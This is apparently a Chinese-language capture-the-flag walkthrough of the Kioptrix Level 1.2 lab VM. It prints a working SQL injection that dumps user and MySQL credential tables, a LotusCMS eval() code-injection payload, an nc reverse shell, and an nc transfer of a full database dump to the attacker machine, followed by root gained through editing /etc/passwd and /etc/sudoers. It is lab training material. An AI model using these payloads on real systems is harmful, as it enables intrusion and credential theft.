# KIOPTRIX: LEVEL 1.2 (#3)

### 目标探测：

可以看到目标运行在192.168.43.48 VMware, Inc.

```
┌──(root㉿kali)-[~/Desktop/test/KIOPTRIXLEVEL1.2.3/LotusCMS-Exploit]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f5:d6:36, IPv4: 192.168.43.23
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.43.1    9e:7b:7e:db:9c:66       (Unknown: locally administered)
192.168.43.48   00:0c:29:65:54:26       VMware, Inc.
192.168.43.175  70:32:17:c7:c0:63       Intel Corporate
```

nmap扫描目标IP

```
┌──(root㉿kali)-[~/Desktop/test/KIOPTRIXLEVEL1.2.3/LotusCMS-Exploit]
└─# nmap -sC -sV -A 192.168.43.48 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-03 08:52 EDT
Nmap scan report for kioptrix3.com (192.168.43.48)
Host is up (0.0015s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Ligoat Security - Got Goat? Security ...
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
MAC Address: 00:0C:29:65:54:26 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.55 ms kioptrix3.com (192.168.43.48)
```

可以看到 目标开放了两个端口22和80端口，还发现模板绑定着一个域名，将其加入到我们的host文件当中，用vim编辑它/etc/hosts

{% code lineNumbers="true" %}
```
127.0.0.1       localhost
127.0.1.1       kali
192.168.43.48   kioptrix3.com
```
{% endcode %}

先用gobuster扫描一下有没有隐藏的路径

```
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://kioptrix3.com/ -w /usr/share/wordlists/wfuzz/general/big.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://kioptrix3.com/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/wfuzz/general/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/03 21:41:14 Starting gobuster in directory enumeration mode
===============================================================
/cache                (Status: 301) [Size: 353] [--> http://kioptrix3.com/cache/]
/core                 (Status: 301) [Size: 352] [--> http://kioptrix3.com/core/]
/data                 (Status: 403) [Size: 324]
/phpmyadmin           (Status: 301) [Size: 358] [--> http://kioptrix3.com/phpmyadmin/]
Progress: 2245 / 3025 (74.21%)
===============================================================
2023/07/03 21:41:16 Finished
===============================================================
```

先用浏览器访问web的80端口，首页，blog，登录页，这个页面有提到CMS，查看一下网页源码发现是LotusCMS

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

查看发现有两篇博客，第一个发现有一个目录，第二个在这里我们看到 Ligoat 雇佣了一名新员工，他们似乎用他的用户名来称呼他：loneferret。

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

还注意到可以在博客文章上留下评论，这可能会在以后提供潜在的攻击媒介。现在，继续枚举图库应用程序。



我们找到一个基本的图片库应用程序

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

标题将此页面称为“Gallarific”，消息来源证实这似乎是该应用程序的名称：

```
<meta http-equiv="Generator" content="Gallarific" />
```

登录页面

这是一个常见的登录页面，尝试用一些常见的SQLI，并没有什么作用，尝试其它的方法

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

### 初步利用:

有很多途径可以在这台机器上获得初始 shell。我们将看一下其中的三个。

暴力破解

获取 shell 的最简单（也许也是最耗时）的方法是通过暴力破解 SSH 凭据。

我们之前可以从一篇博客文章中了解到潜在的用户名 loneferret。如果这实际上是一个有效的系统帐户，并且他使用了弱密码，那么我们也许能够暴力破解他的凭据并获得对 shell 的访问权限。

我们可以尝试使用流行的 Hydra 工具和 rockyou.txt 单词列表进行暴力攻击。 我们将使用以下命令：

这里应为环境问题不能成功运行hydra，但是看大佬能通过hydra爆破出密码，这里先跳过

```
```

### 利用 Gallarific

从我们之前的列举中，我们了解到画廊应用程序似乎是一种名为“Gallarific”的东西。让我们搜索任何已知的漏洞。

```
┌──(root㉿kali)-[~/Desktop/test/KIOPTRIXLEVEL1.2.3/LotusCMS-Exploit]
└─# searchsploit Gallarific
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gallarific - 'search.php?query' Cross-Site Scripting                                                                                                                                                      | php/webapps/31369.txt
Gallarific - 'user.php' Arbirary Change Admin Information                                                                                                                                                 | php/webapps/8796.html
Gallarific - Multiple Script Direct Request Authentication Bypass                                                                                                                                         | php/webapps/31370.txt
Gallarific 1.1 - '/gallery.php' Arbitrary Delete/Edit Category                                                                                                                                            | php/webapps/9421.txt
GALLARIFIC PHP Photo Gallery Script - 'gallery.php' SQL Injection                                                                                                                                         | php/webapps/15891.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

发现有个SQL注入，让我们用-m参数将它保存到我们当前目录，查看它，这里有提到/gadmin/index.php的一个页面

```
===[ Exploit ]===

www.site.com/gallery.php?id=null[Sql Injection]

www.site.com/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8+from+gallarific_users--

===[ Admin Panel ]===

www.site.com/gadmin/index.php
```

```
http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users--
```

这里返回了一个登录凭证

<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

我这边还没有找到这个程序的登录窗口，这边查看网页源码查找一下，发现这有个跳转

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

访问它一下，跳转到了登录页面

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

现在可以使用登录凭据登录这个应用程序

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

之前用gobuster扫描的时候发现有一个phpmyadmin的页面，设这边使用SQL注入进一步查找登录凭证，

我们可以尝试使用 SQL 注入来转储mysql.user表

```
http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(user,0x3a,password),3,4,5,6+from+mysql.user--
```

这里查询到了有用的信息

<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

我们可以尝试用jhon来破解这个hashcat，我们还可以通过google来查询是否已存在这个哈希的正解，我将添加`-kioptrix`到查询中，以尽量避免任何特定于 Kioptrix 的剧透

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

这样我们就获得了一个phpmyadmin的一个登录凭证，root:fuckeyou通过搜索服务器，我们在`gallery`数据库中发现了一个有趣的表：`dev_accounts`。使用该`SQL`选项卡运行查询并转储表的内容。我们发现更多的哈希值：

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

现在我们可以将它们放入 CrackStation 并找到明文凭证：

{% embed url="https://crackstation.net/" %}

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

### 进一步漏洞利用：

接下来让我们查看一下LotusCMS是否存在漏洞

```
┌──(root㉿kali)-[~]
└─# searchsploit lotus CMS
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Lotus CMS Fraise 3.0 - Local File Inclusion / Remote Code Execution               | php/webapps/15964.py
Lotus Core CMS 1.0.1 - Local File Inclusion                                       | php/webapps/47985.txt
Lotus Core CMS 1.0.1 - Remote File Inclusion                                      | php/webapps/5866.txt
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                     | php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                                         | php/webapps/16982.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

可以发现这个CMS相关的漏洞有文件包含和命令执行这里有一个msf的模块，我们这里尝试手动

通过谷歌搜索在[Packet Storm](https://packetstormsecurity.com/files/122161/LotusCMS-3.0-PHP-Code-Execution.html)上面发现一个python的漏洞利用脚本，将其下载下来。

我们从漏洞利用代码中了解到，这里的神奇之处在于将 PHP 代码注入到 index.php 文件的请求参数中。 格式如下：

```
http://target/index.php?page=index');${some_php_code_here()};#
```

我们尝试一下查看/etc/passwd

```
http://192.168.40.132/index.php?page=index');${system('cat /etc/passwd')};#
```

这里错误，文件中的第 26 行执行了一个 eval() 函数，但在执行过程中发生了语法错误,我们需要对payload进行url编码再进行尝试

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

payload编码后重新发送请求，命令成功执行了

<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

生成nc反向shell再次发送请求，将以下payload进行url编码，攻击机监听8886

```
index');${system('nc -c bash 192.168.40.131 8886')};#
```

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

可以看到返回一个www-data的一个用户，继续看下有什么有用的信息，先获取一个交互式的 Bash Shell

```
 python -c "import pty;pty.spawn('/bin/bash')"
```

&#x20;在此之前我们已经知道了目标使用的数据库是MySQL数据库，我们现在可以grep全局查找相关的文件内容，这里有一个密码为fuckeyou

```
www-data@Kioptrix3:/home/www/kioptrix3.com$ grep -R mysql * | grep pass
grep -R mysql * | grep pass
grep: gallery/scopbin/911006.php.save: Permission denied
gallery/gfunctions.php:                                    $GLOBALS["gallarific_mysql_password"])
gallery/install.BAK:        if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {                                                       
gallery/gconfig.php:    $GLOBALS["gallarific_mysql_password"] = "fuckeyou";                                         
gallery/gconfig.php:if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {

www-data@Kioptrix3:/home/www/kioptrix3.com$ grep GLOBALS gallery/gconfig.php
grep GLOBALS gallery/gconfig.php
        $GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";
        $GLOBALS["gallarific_mysql_server"] = "localhost";
        $GLOBALS["gallarific_mysql_database"] = "gallery";
        $GLOBALS["gallarific_mysql_username"] = "root";
        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";
if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {
        if(!$g_mysql_d = @mysql_select_db($GLOBALS["gallarific_mysql_database"], $g_mysql_c)) {
                                $GLOBALS["{$data['settings_name']}"]=$data['settings_value'];
```

我们现在有了mysql的root用户名和密码

从这里，我们可以像上一节中那样返回 phpMyAdmin。这次我们尝试不同的方法。

`mysql`由于我们的 shell 有限，目前使用客户端访问数据库会很麻烦。或者，我们可以将`mysqldump`所有数据库转储到文本文件中。然后我们可以将文件传输回攻击者以便于搜索。

从我们的攻击者那里，启动 Netcat 侦听器来捕获文件：

```
┌──(root㉿kali)-[~]
└─# nc -nlvp 3333 > db.sql  
listening on [any] 3333 ...
```



```
www-data@Kioptrix3:/home/www/kioptrix3.com$ mysqldump -u root -p --all-databases > /tmp/db.sql
<w/kioptrix3.com$ mysqldump -u root -p --all-databases > /tmp/db.sql         
Enter password: fuckeyou
www-data@Kioptrix3:/home/www/kioptrix3.com$ ls /tmp
ls /tmp
db.sql
www-data@Kioptrix3:/home/www/kioptrix3.com$ nc 192.168.23.131 3333 < /tmp/db.sql
<w/kioptrix3.com$ nc 192.168.23.131 3333 < /tmp/db.sql
```

我们现在可以检查该文件中的任何凭据。

```
INSERT INTO `dev_accounts` VALUES (1,'dreg','0d3eccfb887aabd50f243b3f155c0f85'),(2,'loneferret','5badcaf789d3d1d09794d8f021f40f0e');
```

发现存在两个hash值，与我们之前通过SQL注入查询到的一样

```
dreg:0d3eccfb887aabd50f243b3f155c0f85
loneferret:5badcaf789d3d1d09794d8f021f40f0e
```

我们可以将它们放入 CrackStation（见上文），然后我们就得到了密码！



### 权限提升

我们从转储中得知`/etc/passwd`，`dreg`和`loneferret`似乎都是 Kioptrix 盒子上的有效帐户。我们还在`loneferret`枚举过程开始时看到博客文章中提到了（并找到了他的密码`hydra`），所以让我们使用他的凭据登录：

```
┌──(root㉿kali)-[~]
└─# ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss loneferret@192.168.23.130
```

我们成功登录了这个用户，查看当前目录CompanyPolicy.README这个文件发现了一个ht编辑器是有sudo权限位的，通过sudo -l可以确定这一点

```
loneferret@Kioptrix3:~$ ls
checksec.sh  CompanyPolicy.README
loneferret@Kioptrix3:~$ cat CompanyPolicy.README
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

&#x20;我们可以使用以超级用户权限运行的文本编辑器做什么？

让我们劫持一个系统帐户。`games`我将在这个例子中使用。

我们需要修改`TERM`环境变量来运行编辑器：

```
loneferret@Kioptrix3:~$ sudo ht
Error opening terminal: xterm-256color.
```

这个错误通常发生在尝试使用sudo命令时，由于终端类型设置不正确而导致无法打开终端。可以尝试以下方法解决这个问题：

设置正确的终端类型：你可以通过设置`TERM`环境变量为正确的终端类型来解决该问题。常见的终端类型包括`xterm`、`xterm-color`等。使用以下命令设置`TERM`环境变量：

```
export TERM=xterm
```

现在`sudo ht`启动编辑器。打开`/etc/passwd`文件，然后（**重要**）将副本保存在安全的地方，alt+f，选择F3那个打开/etc/passwd文件，开始编辑

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

我们现在要做的是生成密码哈希并将其提供给`games`用户。要创建哈希，我们可以使用以下`openssl`工具：

```
┌──(root㉿kali)-[~]
└─# openssl passwd -1 -salt pwned
Password: 
$1$pwned$RGq/Z65jqs1jEZhVtg.Aj0
```

现在我们可以将此哈希值复制并粘贴到用户的文件中`games`（替换 ）`x`并将文件保存回`/etc/passwd`.

```
games:$1$pwned$RGq/Z65jqs1jEZhVtg.Aj0:5:60:games:/usr/games:/bin/sh
```

此时，我们应该能够通过 SSH 连接到盒子，如下所示`games`：

```
┌──(root㉿kali)-[~]
└─# ssh games@192.168.23.130 -oHostKeyAlgorithms=ssh-rsa,ssh-dss
games@192.168.23.130's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
$ 
```

我们有我们的帐户，但我们需要添加`sudo`权限。

返回编辑器，打开`/etc/sudoers`，并将以下行添加到末尾：

```
games ALL=NOPASSWD: ALL
```

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

回到我们的 SSH 会话，`sudo`再次检查我们的权限。

```
$ sudo -l
User games may run the following commands on this host:
    (root) NOPASSWD: ALL
$ sudo -s
# id
uid=0(root) gid=0(root) groups=0(root)
```

root权限

```
# cd /root      
# pwd
/root
# ls -l
total 16
-rw-r--r--  1 root root  1327 2011-04-16 08:13 Congrats.txt
drwxr-xr-x 12 root root 12288 2011-04-16 07:26 ht-2.0.18
```
